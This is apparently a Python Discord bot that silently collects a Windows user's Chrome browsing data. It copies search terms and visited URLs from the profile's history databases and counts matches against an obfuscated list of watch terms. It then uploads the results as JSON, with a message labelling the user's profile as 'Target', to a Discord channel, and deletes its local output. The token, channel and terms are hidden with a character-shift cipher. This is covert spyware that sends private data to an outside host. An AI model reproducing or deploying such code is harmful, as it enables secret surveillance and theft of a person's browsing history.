import sqlite3, json, os, shutil
from datetime import datetime
import nextcord
from nextcord.ext import commands
from commands import *

class FetchCommand:
    def __init__(self, query, type, command, terms):
        self.query = query
        self.type = type
        self.command = command
        self.checkterms = {Fetcher.Decrypt(k):0 for k in terms.split(",")}

    def format(self, results):
        col = []
        self.checkterms = {k:0 for k in self.checkterms}
        for result in results:
            for term in self.checkterms:
                if term in result[0]: self.checkterms[term]+=1

            date, time = result[1].split(" ")
            col.append({
                self.type: result[0],
                "Date": date,
                "Time": time
            })
        return col

class Fetcher:
    TargetDir = fr"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\\"
    EncryptStep = None
    Bot = commands.Bot(intents=nextcord.Intents.all())
    Channel = ChannelID = None
    Paths = []
    CurrentPath = None

    Root = os.path.dirname(os.path.abspath(__file__))+"\\"
    Out = f"{Root}out\\"

    Commands = []

    @staticmethod
    def Decrypt(string):
        return ''.join([chr(ord(c)-Fetcher.EncryptStep) for c in str(string)])

    @staticmethod
    def Run():
        Get = lambda string: os.environ.get(string)
        Fetcher.EncryptStep = int(Get("ENC"))

        Fetcher.ChannelID = int(Fetcher.Decrypt(Get("CHA")))
        Fetcher.Commands = [
            FetchCommand("Search Terms", "Query", term_cmd, Get("CT")),
            FetchCommand("URLs", "URL", url_cmd, Get("CU"))
        ]
        Fetcher.Paths = os.listdir(Fetcher.Out)
        try:
            Fetcher.Bot.run(Fetcher.Decrypt(Get("TOK")))
        except: pass

    @staticmethod
    @Bot.event
    async def on_ready():
        Fetcher.Channel = Fetcher.Bot.get_channel(Fetcher.ChannelID)
        if not Fetcher.Channel: return

        await Fetcher.Channel.send(f"Time: `{datetime.now().strftime('%d/%m/%Y %H:%M')}`\nTarget: `{os.environ['USERPROFILE']}`")

        for i in Fetcher.Paths:
            Fetcher.CurrentPath = Fetcher.TargetDir+i
            await Fetcher.Fetch(Fetcher.Out+i)
        shutil.rmtree(Fetcher.Out)
        await Fetcher.Bot.close()

    @staticmethod
    async def Fetch(file):
        conn = sqlite3.connect(file)
        cursor = conn.cursor()

        contents = {}
        for command in Fetcher.Commands:
            cursor.execute(command.command)
            contents.update({command.query: command.format(cursor.fetchall())})
        for i in [cursor, conn]: i.close()

        filename = f"{Fetcher.Out}{datetime.now().strftime('%d-%m-%Y')}.json"
        with open(filename, "w") as file:
            file.write(json.dumps(contents, indent=4))

        await Fetcher.Transfer(filename)

    @staticmethod
    def GetSummary():
        sep = 20
        output = []
        output.append(f"Path: {Fetcher.CurrentPath}")
        for command in Fetcher.Commands:
            header = f"{command.query:<{sep}}Instances"
            output.append(f"{header}\n{''.join(['-' for i in range(len(header))])}")
            for term in [i for i in command.checkterms if command.checkterms[i]>0]:
                output.append(f"{term:<{sep}}{command.checkterms[term]}")
            output.append("\n")
        return '\n'.join(output)
            
 
    @staticmethod
    async def Transfer(filename):
        await Fetcher.Channel.send(content=f"```{Fetcher.GetSummary()}```", file=nextcord.File(filename))